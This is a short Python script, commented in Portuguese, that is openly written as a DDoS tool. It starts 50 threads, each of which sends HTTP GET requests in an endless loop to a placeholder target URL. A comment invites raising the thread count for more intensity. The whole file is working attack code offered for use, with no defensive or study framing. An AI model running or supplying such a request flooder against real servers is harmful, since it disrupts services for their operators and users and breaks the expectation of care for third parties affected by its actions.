import requests # type: ignore

import threading

# Função para enviar múltiplas requisições HTTP para o servidor
def ddos_attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Requisição enviada. Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erro na requisição: {e}")

# URL do alvo (substitua com o endereço real)
target_url = 'http://exemplo.com'

# Criando múltiplos threads para simular um ataque DDoS
for _ in range(50):  # O número de threads pode ser aumentado para aumentar a intensidade
    thread = threading.Thread(target=ddos_attack, args=(target_url,))
    thread.start()
